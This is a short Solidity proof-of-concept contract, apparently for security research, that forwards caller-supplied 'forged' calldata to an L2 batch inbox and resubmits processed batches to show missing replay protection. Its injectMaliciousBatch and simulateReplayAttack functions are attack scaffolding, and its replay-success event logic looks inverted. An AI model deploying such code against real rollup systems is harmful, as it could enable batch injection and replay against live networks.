// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IL2BatchInbox {
    function submitBatch(bytes calldata data) external;
}

/**
 * @title L2ReplayPoC - L2 Batch Replay Attack Proof of Concept
 * @notice This contract demonstrates how batch replay attacks could work on L2 systems
 * @dev For educational and security research purposes only
 */
contract L2ReplayPoC {
    IL2BatchInbox public batcher;
    mapping(bytes32 => bool) public processedBatches;
    uint256 public totalBatchesSubmitted;
    
    event MaliciousBatchInjected(bytes32 indexed batchHash, bytes data);
    event ReplayAttempt(bytes32 indexed batchHash, bool wasSuccessful);
    
    constructor(address _batcher) {
        require(_batcher != address(0), "Invalid batcher address");
        batcher = IL2BatchInbox(_batcher);
    }

    /**
     * @notice Inject a malicious batch into the L2 system
     * @param forgedCalldata The forged batch data to inject
     */
    function injectMaliciousBatch(bytes calldata forgedCalldata) external {
        bytes32 batchHash = keccak256(forgedCalldata);
        
        // Track if this is a replay attempt
        bool isReplay = processedBatches[batchHash];
        
        // Submit the batch (this would be the vulnerability - no replay protection)
        batcher.submitBatch(forgedCalldata);
        
        // Mark as processed
        processedBatches[batchHash] = true;
        totalBatchesSubmitted++;
        
        emit MaliciousBatchInjected(batchHash, forgedCalldata);
        emit ReplayAttempt(batchHash, !isReplay);
    }
    
    /**
     * @notice Check if a batch has been processed before
     * @param data The batch data to check
     * @return Whether the batch was already processed
     */
    function isBatchProcessed(bytes calldata data) external view returns (bool) {
        return processedBatches[keccak256(data)];
    }
    
    /**
     * @notice Simulate a replay attack by resubmitting the same batch
     * @param originalBatch The original batch to replay
     */
    function simulateReplayAttack(bytes calldata originalBatch) external {
        bytes32 batchHash = keccak256(originalBatch);
        require(processedBatches[batchHash], "Batch not yet processed");
        
        // This demonstrates the vulnerability - replaying already processed batches
        this.injectMaliciousBatch(originalBatch);
    }
}
